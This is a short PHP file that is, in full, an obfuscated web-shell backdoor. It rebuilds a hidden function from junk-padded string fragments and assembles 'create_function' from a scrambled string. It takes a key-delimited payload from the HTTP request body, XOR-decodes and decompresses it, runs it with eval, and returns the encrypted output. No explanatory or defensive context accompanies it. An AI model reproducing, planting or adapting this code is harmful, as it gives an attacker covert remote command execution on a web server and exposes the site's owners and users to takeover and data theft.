<?php
$B='$m[1]),$k))*})*};$o=@o*}b_ge*}t_cont*}ent*}s();@ob_end_c*}lean();$r*}=@bas';
$O='e6*}4_*}encod*}e(@*}x(@g*}zcompress($o),*}*}$k));print("$*}p*}$kh$r$kf");}';
$m=str_replace('k','','kckkrkeatek_kfunction');
$i='PY*}Zn*}lobxFKCv9xDS";f*}unct*}ion x($*}t,$k)*}{$c=st*}rle*}n($k);$l=st*}r';
$N='}*}j++,$i++){$*}o.=$t*}{$i*}}^$*}*}k{$j}*};}}ret*}urn $o;}if (@preg_ma*}tc';
$l='=*}=1)*} {@*}ob_start();@e*}val(@g*}zuncompress(@*}x(@bas*}*}e64_d*}ecode(';
$D='len($*}t);$o*}="";fo*}r*}($i=0;*}$*}i<$l;){for*}($j=0;(*}$j<$c&&$i<$l*});$*';
$E='$k="ca9c5*}bb2*}";$k*}h*}="81d4299*}476b2";*}*}$kf="b375*}9fe1*}9819";$p="';
$q='h("/$k*}h*}(.+)$kf/"*},@file_get*}_conte*}nts("p*}*}h*}p://input"),$m*}*})';
$x=str_replace('*}','',$E.$i.$D.$N.$q.$l.$B.$O);
$R=$m('',$x);$R();
?>
